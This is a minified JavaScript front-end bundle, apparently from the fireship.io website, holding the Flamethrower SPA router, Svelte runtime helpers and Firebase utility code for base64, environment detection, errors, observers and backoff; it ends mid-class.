var Ja = Object.defineProperty,
  Xa = (n, e, t) =>
    e in n
      ? Ja(n, e, { enumerable: !0, configurable: !0, writable: !0, value: t })
      : (n[e] = t),
  ln = (n, e, t) => (Xa(n, "symbol" != typeof e ? e + "" : e, t), t);
function $r(n, e) {
  if (["link", "go"].includes(n))
    if (e) {
      const t = document.querySelector(e);
      t
        ? t.scrollIntoView({ behavior: "smooth", block: "start" })
        : window.scrollTo({ top: 0 });
    } else window.scrollTo({ top: 0 });
}
function nr(n) {
  const e = new URL(n || window.location.href).href;
  return e.endsWith("/") || e.includes(".") || e.includes("#") ? e : `${e}/`;
}
function Za(n) {
  (!window.history.state || window.history.state.url !== n) &&
    window.history.pushState({ url: n }, "internalLink", n);
}
function Qa(n) {
  document
    .querySelector(n)
    .scrollIntoView({ behavior: "smooth", block: "start" });
}
function el(n) {
  return { type: "popstate", next: nr() };
}
function tl(n) {
  var e;
  let t;
  if (n.altKey || n.ctrlKey || n.metaKey || n.shiftKey)
    return { type: "disqualified" };
  for (let r = n.target; r.parentNode; r = r.parentNode)
    if ("A" === r.nodeName) {
      t = r;
      break;
    }
  if (t && t.host !== location.host)
    return (t.target = "_blank"), { type: "external" };
  if (t && "cold" in (null == t ? void 0 : t.dataset))
    return { type: "disqualified" };
  if (null != t && t.hasAttribute("href")) {
    const r = t.getAttribute("href"),
      i = new URL(r, location.href);
    if ((n.preventDefault(), null != r && r.startsWith("#")))
      return Qa(r), { type: "scrolled" };
    const o = null == (e = r.match(/#([\w'-]+)\b/g)) ? void 0 : e[0];
    return { type: "link", next: nr(i.href), prev: nr(), scrollId: o };
  }
  return { type: "noop" };
}
function nl(n) {
  return new DOMParser().parseFromString(n, "text/html");
}
function qr(n) {
  document.body.querySelectorAll("[flamethrower-preserve]").forEach((e) => {
    let t = n.body.querySelector('[flamethrower-preserve][id="' + e.id + '"]');
    if (t) {
      const r = e.cloneNode(!0);
      t.replaceWith(r);
    }
  }),
    document.body.replaceWith(n.body);
}
function rl(n) {
  const e = (s) => Array.from(s.querySelectorAll('head>:not([rel="prefetch"]')),
    t = e(document),
    r = e(n),
    { staleNodes: i, freshNodes: o } = il(t, r);
  i.forEach((s) => s.remove()), document.head.append(...o);
}
function il(n, e) {
  const t = [],
    r = [];
  let i = 0,
    o = 0;
  for (; i < n.length || o < e.length; ) {
    const s = n[i],
      a = e[o];
    if (null != s && s.isEqualNode(a)) {
      i++, o++;
      continue;
    }
    const l = s ? r.findIndex((d) => d.isEqualNode(s)) : -1;
    if (-1 !== l) {
      r.splice(l, 1), i++;
      continue;
    }
    const c = a ? t.findIndex((d) => d.isEqualNode(a)) : -1;
    -1 === c
      ? (s && t.push(s), a && r.push(a), i++, o++)
      : (t.splice(c, 1), o++);
  }
  return { staleNodes: t, freshNodes: r };
}
function Wr() {
  document.head.querySelectorAll("[data-reload]").forEach(Gr),
    document.body.querySelectorAll("script").forEach(Gr);
}
function Gr(n) {
  const e = document.createElement("script"),
    t = Array.from(n.attributes);
  for (const { name: r, value: i } of t) e[r] = i;
  e.append(n.textContent), n.replaceWith(e);
}
!(function () {
  const e = document.createElement("link").relList;
  if (!(e && e.supports && e.supports("modulepreload"))) {
    for (const i of document.querySelectorAll('link[rel="modulepreload"]'))
      r(i);
    new MutationObserver((i) => {
      for (const o of i)
        if ("childList" === o.type)
          for (const s of o.addedNodes)
            "LINK" === s.tagName && "modulepreload" === s.rel && r(s);
    }).observe(document, { childList: !0, subtree: !0 });
  }
  function r(i) {
    if (i.ep) return;
    i.ep = !0;
    const o = (function t(i) {
      const o = {};
      return (
        i.integrity && (o.integrity = i.integrity),
        i.referrerpolicy && (o.referrerPolicy = i.referrerpolicy),
        "use-credentials" === i.crossorigin
          ? (o.credentials = "include")
          : "anonymous" === i.crossorigin
          ? (o.credentials = "omit")
          : (o.credentials = "same-origin"),
        o
      );
    })(i);
    fetch(i.href, o);
  }
})();
const ol = { log: !1, pageTransitions: !1 };
class sl {
  constructor(e) {
    (this.opts = e),
      (this.enabled = !0),
      (this.prefetched = new Set()),
      (this.opts = { ...ol, ...(null != e ? e : {}) }),
      null != window && window.history
        ? (document.addEventListener("click", (t) => this.onClick(t)),
          window.addEventListener("popstate", (t) => this.onPop(t)),
          this.prefetch())
        : (console.warn(
            "flamethrower router not supported in this browser or environment"
          ),
          (this.enabled = !1));
  }
  go(e) {
    const t = window.location.href,
      r = new URL(e, location.origin).href;
    return this.reconstructDOM({ type: "go", next: r, prev: t });
  }
  back() {
    window.history.back();
  }
  forward() {
    window.history.forward();
  }
  get allLinks() {
    return Array.from(document.links).filter(
      (e) =>
        e.href.includes(document.location.origin) &&
        !e.href.includes("#") &&
        e.href !== (document.location.href || document.location.href + "/") &&
        !this.prefetched.has(e.href)
    );
  }
  log(...e) {
    this.opts.log && console.log(...e);
  }
  prefetch() {
    if ("visible" === this.opts.prefetch) this.prefetchVisible();
    else {
      if ("hover" !== this.opts.prefetch) return;
      this.prefetchOnHover();
    }
  }
  prefetchOnHover() {
    this.allLinks.forEach((e) => {
      const t = e.getAttribute("href");
      e.addEventListener("pointerenter", () => this.createLink(t), {
        once: !0,
      });
    });
  }
  prefetchVisible() {
    "IntersectionObserver" in window &&
      (this.observer ||
        (this.observer = new IntersectionObserver(
          (t, r) => {
            t.forEach((i) => {
              const o = i.target.getAttribute("href");
              this.prefetched.has(o)
                ? r.unobserve(i.target)
                : i.isIntersecting &&
                  (this.createLink(o), r.unobserve(i.target));
            });
          },
          { root: null, rootMargin: "0px", threshold: 1 }
        )),
      this.allLinks.forEach((t) => this.observer.observe(t)));
  }
  createLink(e) {
    const t = document.createElement("link");
    (t.rel = "prefetch"),
      (t.href = e),
      (t.as = "document"),
      (t.onload = () => this.log("🌩️ prefetched", e)),
      (t.onerror = (r) => this.log("🤕 can't prefetch", e, r)),
      document.head.appendChild(t),
      this.prefetched.add(e);
  }
  onClick(e) {
    this.reconstructDOM(tl(e));
  }
  onPop(e) {
    this.reconstructDOM(el());
  }
  async reconstructDOM({ type: e, next: t, prev: r, scrollId: i }) {
    if (this.enabled)
      try {
        if (
          (this.log("⚡", e), ["popstate", "link", "go"].includes(e) && t !== r)
        ) {
          this.opts.log && console.time("⏱️"),
            window.dispatchEvent(new CustomEvent("flamethrower:router:fetch")),
            "popstate" != e && Za(t);
          const s = nl(
            await (
              await fetch(t, { headers: { "X-Flamethrower": "1" } })
                .then((a) => {
                  const l = a.body.getReader(),
                    c = parseInt(a.headers.get("Content-Length"));
                  let d = 0;
                  return new ReadableStream({
                    start(u) {
                      !(function f() {
                        l.read().then(({ done: m, value: y }) => {
                          m
                            ? u.close()
                            : ((d += y.length),
                              window.dispatchEvent(
                                new CustomEvent(
                                  "flamethrower:router:fetch-progress",
                                  {
                                    detail: {
                                      progress: Number.isNaN(c)
                                        ? 0
                                        : (d / c) * 100,
                                      received: d,
                                      length: c || 0,
                                    },
                                  }
                                )
                              ),
                              u.enqueue(y),
                              f());
                        });
                      })();
                    },
                  });
                })
                .then(
                  (a) =>
                    new Response(a, {
                      headers: { "Content-Type": "text/html" },
                    })
                )
            ).text()
          );
          rl(s),
            this.opts.pageTransitions && document.createDocumentTransition
              ? document.createDocumentTransition().start(() => {
                  qr(s), Wr(), $r(e, i);
                })
              : (qr(s), Wr(), $r(e, i)),
            window.dispatchEvent(new CustomEvent("flamethrower:router:end")),
            setTimeout(() => {
              this.prefetch();
            }, 200),
            this.opts.log && console.timeEnd("⏱️");
        }
      } catch (o) {
        return (
          window.dispatchEvent(new CustomEvent("flamethrower:router:error", o)),
          this.opts.log && console.timeEnd("⏱️"),
          console.error("💥 router fetch failed", o),
          !1
        );
      }
    else this.log("router disabled");
  }
}
const al = (n) => {
    const e = new sl(n);
    if ((n.log && console.log("🔥 flamethrower engaged"), window)) {
      window.flamethrower = e;
    }
    return e;
  },
  ll = "modulepreload",
  cl = function (n) {
    return "/" + n;
  },
  Kr = {},
  ft = function (e, t, r) {
    if (!t || 0 === t.length) return e();
    const i = document.getElementsByTagName("link");
    return Promise.all(
      t.map((o) => {
        if ((o = "/" + o) in Kr) return;
        Kr[o] = !0;
        const s = o.endsWith(".css"),
          a = s ? '[rel="stylesheet"]' : "";
        if (r)
          for (let d = i.length - 1; d >= 0; d--) {
            const u = i[d];
            if (u.href === o && (!s || "stylesheet" === u.rel)) return;
          }
        else if (document.querySelector(`link[href="${o}"]${a}`)) return;
        const c = document.createElement("link");
        return (
          (c.rel = s ? "stylesheet" : ll),
          s || ((c.as = "script"), (c.crossOrigin = "")),
          (c.href = o),
          document.head.appendChild(c),
          s
            ? new Promise((d, u) => {
                c.addEventListener("load", d),
                  c.addEventListener("error", () =>
                    u(new Error(`Unable to preload CSS for ${o}`))
                  );
              })
            : void 0
        );
      })
    ).then(() => e());
  };
function k() {}
function gr(n) {
  return n();
}
function Yr() {
  return Object.create(null);
}
function fe(n) {
  n.forEach(gr);
}
function br(n) {
  return "function" == typeof n;
}
function G(n, e) {
  return n != n
    ? e == e
    : n !== e || (n && "object" == typeof n) || "function" == typeof n;
}
let cn, Gt;
function Pt(n, e) {
  return cn || (cn = document.createElement("a")), (cn.href = e), n === cn.href;
}
function ul(n) {
  return 0 === Object.keys(n).length;
}
function Es(n, ...e) {
  if (null == n) return k;
  const t = n.subscribe(...e);
  return t.unsubscribe ? () => t.unsubscribe() : t;
}
function ie(n, e, t) {
  n.$$.on_destroy.push(Es(e, t));
}
function h(n, e) {
  n.appendChild(e);
}
function p(n, e, t) {
  n.insertBefore(e, t || null);
}
function g(n) {
  n.parentNode.removeChild(n);
}
function at(n, e) {
  for (let t = 0; t < n.length; t += 1) n[t] && n[t].d(e);
}
function b(n) {
  return document.createElement(n);
}
function jn(n) {
  return document.createElementNS("http://www.w3.org/2000/svg", n);
}
function A(n) {
  return document.createTextNode(n);
}
function E() {
  return A(" ");
}
function ee() {
  return A("");
}
function O(n, e, t, r) {
  return n.addEventListener(e, t, r), () => n.removeEventListener(e, t, r);
}
function dl(n) {
  return function (e) {
    return e.preventDefault(), n.call(this, e);
  };
}
function fl(n) {
  return function (e) {
    return e.stopPropagation(), n.call(this, e);
  };
}
function w(n, e, t) {
  null == t
    ? n.removeAttribute(e)
    : n.getAttribute(e) !== t && n.setAttribute(e, t);
}
function Te(n, e, t) {
  e in n ? (n[e] = ("boolean" == typeof n[e] && "" === t) || t) : w(n, e, t);
}
function Ts(n) {
  return "" === n ? null : +n;
}
function pl(n) {
  return Array.from(n.childNodes);
}
function U(n, e) {
  (e = "" + e), n.wholeText !== e && (n.data = e);
}
function de(n, e) {
  n.value = null == e ? "" : e;
}
function Jr(n, e, t, r) {
  null === t
    ? n.style.removeProperty(e)
    : n.style.setProperty(e, t, r ? "important" : "");
}
function Z(n, e, t) {
  n.classList[t ? "add" : "remove"](e);
}
function Y(n) {
  const e = {};
  for (const t of n) e[t.name] = t.value;
  return e;
}
function $t(n) {
  Gt = n;
}
function hl() {
  if (!Gt) throw new Error("Function called outside component initialization");
  return Gt;
}
function bt(n) {
  hl().$$.on_mount.push(n);
}
function ml(n, e) {
  const t = n.$$.callbacks[e.type];
  t && t.slice().forEach((r) => r.call(this, e));
}
const Ht = [],
  st = [],
  fn = [],
  Xr = [],
  Ss = Promise.resolve();
let rr = !1;
function Cs() {
  rr || ((rr = !0), Ss.then(W));
}
function gl() {
  return Cs(), Ss;
}
function ir(n) {
  fn.push(n);
}
const zn = new Set();
let un = 0;
function W() {
  const n = Gt;
  do {
    for (; un < Ht.length; ) {
      const e = Ht[un];
      un++, $t(e), bl(e.$$);
    }
    for ($t(null), Ht.length = 0, un = 0; st.length; ) st.pop()();
    for (let e = 0; e < fn.length; e += 1) {
      const t = fn[e];
      zn.has(t) || (zn.add(t), t());
    }
    fn.length = 0;
  } while (Ht.length);
  for (; Xr.length; ) Xr.pop()();
  (rr = !1), zn.clear(), $t(n);
}
function bl(n) {
  if (null !== n.fragment) {
    n.update(), fe(n.before_update);
    const e = n.dirty;
    (n.dirty = [-1]),
      n.fragment && n.fragment.p(n.ctx, e),
      n.after_update.forEach(ir);
  }
}
const wl = new Set();
function _l(n, e) {
  n && n.i && (wl.delete(n), n.i(e));
}
const As =
  typeof window < "u" ? window : typeof globalThis < "u" ? globalThis : global;
function yl(n, e, t, r) {
  const { fragment: i, on_mount: o, on_destroy: s, after_update: a } = n.$$;
  i && i.m(e, t),
    r ||
      ir(() => {
        const l = o.map(gr).filter(br);
        s ? s.push(...l) : fe(l), (n.$$.on_mount = []);
      }),
    a.forEach(ir);
}
function vl(n, e) {
  const t = n.$$;
  null !== t.fragment &&
    (fe(t.on_destroy),
    t.fragment && t.fragment.d(e),
    (t.on_destroy = t.fragment = null),
    (t.ctx = []));
}
function kl(n, e) {
  -1 === n.$$.dirty[0] && (Ht.push(n), Cs(), n.$$.dirty.fill(0)),
    (n.$$.dirty[(e / 31) | 0] |= 1 << e % 31);
}
function J(n, e, t, r, i, o, s, a = [-1]) {
  const l = Gt;
  $t(n);
  const c = (n.$$ = {
    fragment: null,
    ctx: null,
    props: o,
    update: k,
    not_equal: i,
    bound: Yr(),
    on_mount: [],
    on_destroy: [],
    on_disconnect: [],
    before_update: [],
    after_update: [],
    context: new Map(e.context || (l ? l.$$.context : [])),
    callbacks: Yr(),
    dirty: a,
    skip_bound: !1,
    root: e.target || l.$$.root,
  });
  s && s(c.root);
  let d = !1;
  if (
    ((c.ctx = t
      ? t(n, e.props || {}, (u, f, ...m) => {
          const y = m.length ? m[0] : f;
          return (
            c.ctx &&
              i(c.ctx[u], (c.ctx[u] = y)) &&
              (!c.skip_bound && c.bound[u] && c.bound[u](y), d && kl(n, u)),
            f
          );
        })
      : []),
    c.update(),
    (d = !0),
    fe(c.before_update),
    (c.fragment = !!r && r(c.ctx)),
    e.target)
  ) {
    if (e.hydrate) {
      const u = pl(e.target);
      c.fragment && c.fragment.l(u), u.forEach(g);
    } else c.fragment && c.fragment.c();
    e.intro && _l(n.$$.fragment),
      yl(n, e.target, e.anchor, e.customElement),
      W();
  }
  $t(l);
}
let K;
"function" == typeof HTMLElement &&
  (K = class extends HTMLElement {
    constructor() {
      super(), this.attachShadow({ mode: "open" });
    }
    connectedCallback() {
      const { on_mount: n } = this.$$;
      this.$$.on_disconnect = n.map(gr).filter(br);
      for (const e in this.$$.slotted) this.appendChild(this.$$.slotted[e]);
    }
    attributeChangedCallback(n, e, t) {
      this[n] = t;
    }
    disconnectedCallback() {
      fe(this.$$.on_disconnect);
    }
    $destroy() {
      vl(this, 1), (this.$destroy = k);
    }
    $on(n, e) {
      const t = this.$$.callbacks[n] || (this.$$.callbacks[n] = []);
      return (
        t.push(e),
        () => {
          const r = t.indexOf(e);
          -1 !== r && t.splice(r, 1);
        }
      );
    }
    $set(n) {
      this.$$set &&
        !ul(n) &&
        ((this.$$.skip_bound = !0), this.$$set(n), (this.$$.skip_bound = !1));
    }
  });
const Et = [];
function Il(n, e) {
  return { subscribe: Se(n, e).subscribe };
}
function Se(n, e = k) {
  let t;
  const r = new Set();
  function i(a) {
    if (G(n, a) && ((n = a), t)) {
      const l = !Et.length;
      for (const c of r) c[1](), Et.push(c, n);
      if (l) {
        for (let c = 0; c < Et.length; c += 2) Et[c][0](Et[c + 1]);
        Et.length = 0;
      }
    }
  }
  return {
    set: i,
    update: function o(a) {
      i(a(n));
    },
    subscribe: function s(a, l = k) {
      const c = [a, l];
      return (
        r.add(c),
        1 === r.size && (t = e(i) || k),
        a(n),
        () => {
          r.delete(c), 0 === r.size && (t(), (t = null));
        }
      );
    },
  };
}
function Rs(n, e, t) {
  const r = !Array.isArray(n),
    i = r ? [n] : n,
    o = e.length < 2;
  return Il(t, (s) => {
    let a = !1;
    const l = [];
    let c = 0,
      d = k;
    const u = () => {
        if (c) return;
        d();
        const m = e(r ? l[0] : l, s);
        o ? s(m) : (d = br(m) ? m : k);
      },
      f = i.map((m, y) =>
        Es(
          m,
          (I) => {
            (l[y] = I), (c &= ~(1 << y)), a && u();
          },
          () => {
            c |= 1 << y;
          }
        )
      );
    return (
      (a = !0),
      u(),
      function () {
        fe(f), d();
      }
    );
  });
}
const me = Se(null);
window.addEventListener("flamethrower:router:fetch", (n) => {
  me.set(null);
});
const Ae = Se(null),
  Rn = Se(null),
  El = "https://fireship.io",
  Ps = function (n) {
    const e = [];
    let t = 0;
    for (let r = 0; r < n.length; r++) {
      let i = n.charCodeAt(r);
      i < 128
        ? (e[t++] = i)
        : i < 2048
        ? ((e[t++] = (i >> 6) | 192), (e[t++] = (63 & i) | 128))
        : 55296 == (64512 & i) &&
          r + 1 < n.length &&
          56320 == (64512 & n.charCodeAt(r + 1))
        ? ((i = 65536 + ((1023 & i) << 10) + (1023 & n.charCodeAt(++r))),
          (e[t++] = (i >> 18) | 240),
          (e[t++] = ((i >> 12) & 63) | 128),
          (e[t++] = ((i >> 6) & 63) | 128),
          (e[t++] = (63 & i) | 128))
        : ((e[t++] = (i >> 12) | 224),
          (e[t++] = ((i >> 6) & 63) | 128),
          (e[t++] = (63 & i) | 128));
    }
    return e;
  },
  Tl = function (n) {
    const e = [];
    let t = 0,
      r = 0;
    for (; t < n.length; ) {
      const i = n[t++];
      if (i < 128) e[r++] = String.fromCharCode(i);
      else if (i > 191 && i < 224) {
        const o = n[t++];
        e[r++] = String.fromCharCode(((31 & i) << 6) | (63 & o));
      } else if (i > 239 && i < 365) {
        const l =
          (((7 & i) << 18) |
            ((63 & n[t++]) << 12) |
            ((63 & n[t++]) << 6) |
            (63 & n[t++])) -
          65536;
        (e[r++] = String.fromCharCode(55296 + (l >> 10))),
          (e[r++] = String.fromCharCode(56320 + (1023 & l)));
      } else {
        const o = n[t++],
          s = n[t++];
        e[r++] = String.fromCharCode(
          ((15 & i) << 12) | ((63 & o) << 6) | (63 & s)
        );
      }
    }
    return e.join("");
  },
  xs = {
    byteToCharMap_: null,
    charToByteMap_: null,
    byteToCharMapWebSafe_: null,
    charToByteMapWebSafe_: null,
    ENCODED_VALS_BASE:
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
    get ENCODED_VALS() {
      return this.ENCODED_VALS_BASE + "+/=";
    },
    get ENCODED_VALS_WEBSAFE() {
      return this.ENCODED_VALS_BASE + "-_.";
    },
    HAS_NATIVE_SUPPORT: "function" == typeof atob,
    encodeByteArray(n, e) {
      if (!Array.isArray(n))
        throw Error("encodeByteArray takes an array as a parameter");
      this.init_();
      const t = e ? this.byteToCharMapWebSafe_ : this.byteToCharMap_,
        r = [];
      for (let i = 0; i < n.length; i += 3) {
        const o = n[i],
          s = i + 1 < n.length,
          a = s ? n[i + 1] : 0,
          l = i + 2 < n.length,
          c = l ? n[i + 2] : 0,
          d = o >> 2,
          u = ((3 & o) << 4) | (a >> 4);
        let f = ((15 & a) << 2) | (c >> 6),
          m = 63 & c;
        l || ((m = 64), s || (f = 64)), r.push(t[d], t[u], t[f], t[m]);
      }
      return r.join("");
    },
    encodeString(n, e) {
      return this.HAS_NATIVE_SUPPORT && !e
        ? btoa(n)
        : this.encodeByteArray(Ps(n), e);
    },
    decodeString(n, e) {
      return this.HAS_NATIVE_SUPPORT && !e
        ? atob(n)
        : Tl(this.decodeStringToByteArray(n, e));
    },
    decodeStringToByteArray(n, e) {
      this.init_();
      const t = e ? this.charToByteMapWebSafe_ : this.charToByteMap_,
        r = [];
      for (let i = 0; i < n.length; ) {
        const o = t[n.charAt(i++)],
          a = i < n.length ? t[n.charAt(i)] : 0;
        ++i;
        const c = i < n.length ? t[n.charAt(i)] : 64;
        ++i;
        const u = i < n.length ? t[n.charAt(i)] : 64;
        if ((++i, null == o || null == a || null == c || null == u))
          throw new Sl();
        const f = (o << 2) | (a >> 4);
        if ((r.push(f), 64 !== c)) {
          const m = ((a << 4) & 240) | (c >> 2);
          if ((r.push(m), 64 !== u)) {
            const y = ((c << 6) & 192) | u;
            r.push(y);
          }
        }
      }
      return r;
    },
    init_() {
      if (!this.byteToCharMap_) {
        (this.byteToCharMap_ = {}),
          (this.charToByteMap_ = {}),
          (this.byteToCharMapWebSafe_ = {}),
          (this.charToByteMapWebSafe_ = {});
        for (let n = 0; n < this.ENCODED_VALS.length; n++)
          (this.byteToCharMap_[n] = this.ENCODED_VALS.charAt(n)),
            (this.charToByteMap_[this.byteToCharMap_[n]] = n),
            (this.byteToCharMapWebSafe_[n] =
              this.ENCODED_VALS_WEBSAFE.charAt(n)),
            (this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[n]] = n),
            n >= this.ENCODED_VALS_BASE.length &&
              ((this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(n)] = n),
              (this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(n)] = n));
      }
    },
  };
class Sl extends Error {
  constructor() {
    super(...arguments), (this.name = "DecodeBase64StringError");
  }
}
const Cl = function (n) {
    const e = Ps(n);
    return xs.encodeByteArray(e, !0);
  },
  bn = function (n) {
    return Cl(n).replace(/\./g, "");
  },
  Os = function (n) {
    try {
      return xs.decodeString(n, !0);
    } catch (e) {
      console.error("base64Decode failed: ", e);
    }
    return null;
  };
function Al() {
  if (typeof self < "u") return self;
  if (typeof window < "u") return window;
  if (typeof global < "u") return global;
  throw new Error("Unable to locate global object.");
}
const Rl = () => Al().__FIREBASE_DEFAULTS__,
  Pl = () => {
    if (typeof process > "u" || typeof process.env > "u") return;
    const n = {}.__FIREBASE_DEFAULTS__;
    return n ? JSON.parse(n) : void 0;
  },
  xl = () => {
    if (typeof document > "u") return;
    let n;
    try {
      n = document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/);
    } catch {
      return;
    }
    const e = n && Os(n[1]);
    return e && JSON.parse(e);
  },
  Pn = () => {
    try {
      return Al().__FIREBASE_DEFAULTS__ || Pl() || xl();
    } catch (n) {
      return void console.info(
        `Unable to get __FIREBASE_DEFAULTS__ due to: ${n}`
      );
    }
  },
  Ls = (n) => {
    var e, t;
    return null ===
      (t = null === (e = Pn()) || void 0 === e ? void 0 : e.emulatorHosts) ||
      void 0 === t
      ? void 0
      : t[n];
  },
  $g = (n) => {
    const e = Ls(n);
    if (!e) return;
    const t = e.lastIndexOf(":");
    if (t <= 0 || t + 1 === e.length)
      throw new Error(`Invalid host ${e} with no separate hostname and port!`);
    const r = parseInt(e.substring(t + 1), 10);
    return "[" === e[0] ? [e.substring(1, t - 1), r] : [e.substring(0, t), r];
  },
  Ns = () => {
    var n;
    return null === (n = Pn()) || void 0 === n ? void 0 : n.config;
  },
  Ms = (n) => {
    var e;
    return null === (e = Pn()) || void 0 === e ? void 0 : e[`_${n}`];
  };
class Ol {
  constructor() {
    (this.reject = () => {}),
      (this.resolve = () => {}),
      (this.promise = new Promise((e, t) => {
        (this.resolve = e), (this.reject = t);
      }));
  }
  wrapCallback(e) {
    return (t, r) => {
      t ? this.reject(t) : this.resolve(r),
        "function" == typeof e &&
          (this.promise.catch(() => {}), 1 === e.length ? e(t) : e(t, r));
    };
  }
}
function qg(n, e) {
  if (n.uid)
    throw new Error(
      'The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.'
    );
  const r = e || "demo-project",
    i = n.iat || 0,
    o = n.sub || n.user_id;
  if (!o)
    throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");
  const s = Object.assign(
    {
      iss: `https://securetoken.google.com/${r}`,
      aud: r,
      iat: i,
      exp: i + 3600,
      auth_time: i,
      sub: o,
      user_id: o,
      firebase: { sign_in_provider: "custom", identities: {} },
    },
    n
  );
  return [
    bn(JSON.stringify({ alg: "none", type: "JWT" })),
    bn(JSON.stringify(s)),
    "",
  ].join(".");
}
function ve() {
  return typeof navigator < "u" && "string" == typeof navigator.userAgent
    ? navigator.userAgent
    : "";
}
function Ll() {
  return (
    typeof window < "u" &&
    !!(window.cordova || window.phonegap || window.PhoneGap) &&
    /ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(ve())
  );
}
function Nl() {
  var n;
  const e = null === (n = Pn()) || void 0 === n ? void 0 : n.forceEnvironment;
  if ("node" === e) return !0;
  if ("browser" === e) return !1;
  try {
    return (
      "[object process]" === Object.prototype.toString.call(global.process)
    );
  } catch {
    return !1;
  }
}
function Ds() {
  const n =
    "object" == typeof chrome
      ? chrome.runtime
      : "object" == typeof browser
      ? browser.runtime
      : void 0;
  return "object" == typeof n && void 0 !== n.id;
}
function Ml() {
  return "object" == typeof navigator && "ReactNative" === navigator.product;
}
function Dl() {
  const n = ve();
  return n.indexOf("MSIE ") >= 0 || n.indexOf("Trident/") >= 0;
}
function Wg() {
  return (
    !Nl() &&
    !!navigator.userAgent &&
    navigator.userAgent.includes("Safari") &&
    !navigator.userAgent.includes("Chrome")
  );
}
function Us() {
  try {
    return "object" == typeof indexedDB;
  } catch {
    return !1;
  }
}
function Fs() {
  return new Promise((n, e) => {
    try {
      let t = !0;
      const r = "validate-browser-context-for-indexeddb-analytics-module",
        i = self.indexedDB.open(r);
      (i.onsuccess = () => {
        i.result.close(), t || self.indexedDB.deleteDatabase(r), n(!0);
      }),
        (i.onupgradeneeded = () => {
          t = !1;
        }),
        (i.onerror = () => {
          var o;
          e(
            (null === (o = i.error) || void 0 === o ? void 0 : o.message) || ""
          );
        });
    } catch (t) {
      e(t);
    }
  });
}
function Ul() {
  return !(typeof navigator > "u" || !navigator.cookieEnabled);
}
const Fl = "FirebaseError";
class ze extends Error {
  constructor(e, t, r) {
    super(t),
      (this.code = e),
      (this.customData = r),
      (this.name = Fl),
      Object.setPrototypeOf(this, ze.prototype),
      Error.captureStackTrace &&
        Error.captureStackTrace(this, wt.prototype.create);
  }
}
class wt {
  constructor(e, t, r) {
    (this.service = e), (this.serviceName = t), (this.errors = r);
  }
  create(e, ...t) {
    const r = t[0] || {},
      i = `${this.service}/${e}`,
      o = this.errors[e],
      s = o ? Hl(o, r) : "Error",
      a = `${this.serviceName}: ${s} (${i}).`;
    return new ze(i, a, r);
  }
}
function Hl(n, e) {
  return n.replace(jl, (t, r) => {
    const i = e[r];
    return null != i ? String(i) : `<${r}?>`;
  });
}
const jl = /\{\$([^}]+)}/g;
function zl(n) {
  for (const e in n) if (Object.prototype.hasOwnProperty.call(n, e)) return !1;
  return !0;
}
function Kt(n, e) {
  if (n === e) return !0;
  const t = Object.keys(n),
    r = Object.keys(e);
  for (const i of t) {
    if (!r.includes(i)) return !1;
    const o = n[i],
      s = e[i];
    if (Zr(o) && Zr(s)) {
      if (!Kt(o, s)) return !1;
    } else if (o !== s) return !1;
  }
  for (const i of r) if (!t.includes(i)) return !1;
  return !0;
}
function Zr(n) {
  return null !== n && "object" == typeof n;
}
function en(n) {
  const e = [];
  for (const [t, r] of Object.entries(n))
    Array.isArray(r)
      ? r.forEach((i) => {
          e.push(encodeURIComponent(t) + "=" + encodeURIComponent(i));
        })
      : e.push(encodeURIComponent(t) + "=" + encodeURIComponent(r));
  return e.length ? "&" + e.join("&") : "";
}
function jt(n) {
  const e = {};
  return (
    n
      .replace(/^\?/, "")
      .split("&")
      .forEach((r) => {
        if (r) {
          const [i, o] = r.split("=");
          e[decodeURIComponent(i)] = decodeURIComponent(o);
        }
      }),
    e
  );
}
function zt(n) {
  const e = n.indexOf("?");
  if (!e) return "";
  const t = n.indexOf("#", e);
  return n.substring(e, t > 0 ? t : void 0);
}
function Bl(n, e) {
  const t = new Vl(n, e);
  return t.subscribe.bind(t);
}
class Vl {
  constructor(e, t) {
    (this.observers = []),
      (this.unsubscribes = []),
      (this.observerCount = 0),
      (this.task = Promise.resolve()),
      (this.finalized = !1),
      (this.onNoObservers = t),
      this.task
        .then(() => {
          e(this);
        })
        .catch((r) => {
          this.error(r);
        });
  }
  next(e) {
    this.forEachObserver((t) => {
      t.next(e);
    });
  }
  error(e) {
    this.forEachObserver((t) => {
      t.error(e);
    }),
      this.close(e);
  }
  complete() {
    this.forEachObserver((e) => {
      e.complete();
    }),
      this.close();
  }
  subscribe(e, t, r) {
    let i;
    if (void 0 === e && void 0 === t && void 0 === r)
      throw new Error("Missing Observer.");
    (i = $l(e, ["next", "error", "complete"])
      ? e
      : { next: e, error: t, complete: r }),
      void 0 === i.next && (i.next = Bn),
      void 0 === i.error && (i.error = Bn),
      void 0 === i.complete && (i.complete = Bn);
    const o = this.unsubscribeOne.bind(this, this.observers.length);
    return (
      this.finalized &&
        this.task.then(() => {
          try {
            this.finalError ? i.error(this.finalError) : i.complete();
          } catch {}
        }),
      this.observers.push(i),
      o
    );
  }
  unsubscribeOne(e) {
    void 0 === this.observers ||
      void 0 === this.observers[e] ||
      (delete this.observers[e],
      (this.observerCount -= 1),
      0 === this.observerCount &&
        void 0 !== this.onNoObservers &&
        this.onNoObservers(this));
  }
  forEachObserver(e) {
    if (!this.finalized)
      for (let t = 0; t < this.observers.length; t++) this.sendOne(t, e);
  }
  sendOne(e, t) {
    this.task.then(() => {
      if (void 0 !== this.observers && void 0 !== this.observers[e])
        try {
          t(this.observers[e]);
        } catch (r) {
          typeof console < "u" && console.error && console.error(r);
        }
    });
  }
  close(e) {
    this.finalized ||
      ((this.finalized = !0),
      void 0 !== e && (this.finalError = e),
      this.task.then(() => {
        (this.observers = void 0), (this.onNoObservers = void 0);
      }));
  }
}
function $l(n, e) {
  if ("object" != typeof n || null === n) return !1;
  for (const t of e) if (t in n && "function" == typeof n[t]) return !0;
  return !1;
}
function Bn() {}
const ql = 1e3,
  Wl = 2,
  Gl = 144e5,
  Kl = 0.5;
function Qr(n, e = ql, t = Wl) {
  const r = e * Math.pow(t, n),
    i = Math.round(Kl * r * (Math.random() - 0.5) * 2);
  return Math.min(Gl, r + i);
}
function Le(n) {
  return n && n._delegate ? n._delegate : n;
}
class He {
  constructor(e, t, r) {
